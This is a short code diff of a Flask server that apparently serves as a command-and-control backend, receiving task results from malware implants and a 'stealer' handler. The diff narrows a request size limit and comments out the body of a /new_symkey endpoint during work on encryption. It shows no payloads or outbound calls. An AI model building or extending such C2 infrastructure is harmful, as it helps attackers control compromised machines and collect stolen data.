@@ -249,14 +249,13 @@ def handle_response_stealer():
 # Addisons Worktime -
 # Attempting to add encryption
 
-
-
+    
 ## For getting new symkey
 @app.route("/new_symkey", methods=["POST"])
 @cross_origin()
 def new_symkey():
     print("Received response")
-    if (request.content_length < 5000000):
+    if (request.content_length < 256):
         try:
             data = request.get_data()
             # print(data)
@@ -268,6 +267,7 @@ def new_symkey():
             print(data)
             print(str(data))
             print(jsonify(data))
+            """
             target_implant_id = data['target_implant_id']
             task_id = data['task_id']
             response_data = data['response_data']
@@ -297,7 +297,7 @@ def new_symkey():
             return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
     else:
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-
+        """
 
 # Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
